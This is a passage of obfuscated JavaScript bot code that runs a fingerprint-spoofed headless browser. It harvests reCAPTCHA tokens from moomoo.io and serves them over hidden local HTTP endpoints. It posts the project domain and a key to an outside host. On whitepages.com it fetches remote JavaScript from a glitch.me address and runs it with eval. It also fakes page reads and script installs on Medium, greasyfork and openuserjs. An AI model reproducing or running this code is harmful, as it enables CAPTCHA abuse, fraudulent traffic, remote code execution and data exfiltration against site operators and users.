      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + Y(0x4) + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + W(0x10) + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + W(0x14) + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + X(0x9, '5]jv') + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x5e * -0x4 + 0x188b + 0x1 * -0x1a03
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1ae4 + 0x23eb + -0x907)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x8dc * -0x3 + 0x53a + 0x15be), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x7b5 * -0x2 + -0x4e7 + 0x14b5), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x2f * -0x5b + -0x2047 + -0x7c9 * -0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x2 * 0x101c + -0x5da * -0x6 + -0x2e4; w < getRandomInt(-0x1ea5 + 0x2 * -0xb57 + -0x2 * -0x1aaa, -0x248b + 0x6da + 0x1db6); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x9 * -0x1651 + -0x11089 * -0x1 + 0xef02 * -0x1);
        }
      }();
    }, 0x7e * 0x2c + -0x18f2 + -0x6 * -0x9d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2508 + -0x94a + -0xddf * 0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1849 + -0x1352 + -0x4f7, 0x687 + 0x2 * -0xbd2 + -0x1 * -0x114f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x40d * 0x35 + 0x179 * 0x2 + 0x148ef * 0x1);
    }, -0x1 * 0x24c1 + 0x217a + 0x3 * 0x139), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * -0x2324 + 0x1a1b + -0x3d3f;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x11c6 + -0x9 * 0x422 + -0x308 * -0x16), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x6b1 + -0x5 * 0x51e + 0x2047), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x2b8dd * 0x6 + 0x14177f + 0x9f94f);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x3a1 + -0x2552 + -0x5 * -0x6d1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x15e2 + 0x50 * 0x62 + 0x2 * -0x19dd);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3997 + -0x997 + 0x8fa * 0xb);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x158f + -0x8b2 + -0x59 * 0x25);
    let h = e[f];
    if (b['rFLJsQ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xdb6 + -0x56d * 0x4 + 0x236a, s, t, u = -0x12c6 + -0x2d * 0xd1 + -0x1281 * -0x3; t = n['charAt'](u++); ~t && (s = r % (0xc1 + 0x140b * -0x1 + 0x134e) ? s * (-0x2005 + 0xe47 + 0x11fe) + t : t, r++ % (0x13c5 + 0x1cc7 + 0x3088 * -0x1)) ? p += String['fromCharCode'](-0x159 * -0x12 + 0x1 * -0x515 + -0x122e & s >> (-(-0x32e + 0x1e6 + 0x6 * 0x37) * r & 0x923 + 0x978 + -0x1295)) : 0x2177 + -0x1 * -0x1279 + -0x33f0) {
          t = o['indexOf'](t);
        }
        for (let v = -0x101 * 0xb + -0x6c5 * 0x2 + 0x1 * 0x1895, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x20b1 * 0x1 + 0x1 * 0x331 + 0x158 * 0x16))['slice'](-(0x3 * -0x54b + -0x809 * -0x3 + 0x838 * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2 * -0xed7 + -0x62b * 0x6 + 0x42b0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x5 * -0x376 + -0x482 + 0x15d0; u < 0x1ebd + -0x26d0 + 0x913; u++) {
          p[u] = u;
        }
        for (u = -0x4 * 0x727 + -0x761 * 0x4 + 0x1f * 0x1e0; u < 0x96b * -0x2 + -0x3 * 0x1b3 + -0x1 * -0x18ef; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * 0x253d + 0x233a + -0x4777), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xd * 0x19d + -0x2 * 0xc94 + 0x42f, q = -0x1558 + -0xdb7 + 0x230f;
        for (let v = 0x4 * -0x4a3 + -0x59 * -0x12 + 0xc4a; v < n['length']; v++) {
          u = (u + (-0xfc5 + 0x884 + 0x742)) % (-0x3 * -0xbf1 + 0x1f22 * 0x1 + -0x41f5), q = (q + p[u]) % (0x270d + 0x298 * 0x2 + -0x2b3d * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x7ae * -0x1 + -0x1049 + 0xb * 0x245)]);
        }
        return t;
      };
      b['NlsQFh'] = m, c = arguments, b['rFLJsQ'] = !![];
    }
    const j = e[-0x26e8 + 0x1fb * -0x1 + -0x1 * -0x28e3],
      k = f + j,
      l = c[k];
    return !l ? (b['YfzfSe'] === undefined && (b['YfzfSe'] = !![]), h = b['NlsQFh'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d,
    a1 = b;
  async function f() {
    const a0 = c,
      Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * -0x683 + 0x205e * -0x1 + 0x26e2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x135f + 0x2300 + -0x1b2f * 0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x378 + 0x2164 + -0x1dec, D['indexOf']('\x20'));
        return B ? E['slice'](0xe75 + 0x1 * 0x25a8 + -0x341d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1e1b + 0xda5 * 0x3 + -0x70f * -0x4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + Z(0x1, 'z9*w') + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x273 * 0x7 + 0x4d16 + -0x1 * 0x14e1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + a0(0xa) + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + a1(0x12, 'a4Gq') + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      a2(0x11) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + a1(0x13, 'Ha7d') + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * 0x1ded + -0xf * -0x59 + -0x1 * 0x2324; k < -0x327 + 0x226 + -0x1d * -0x9; k++)
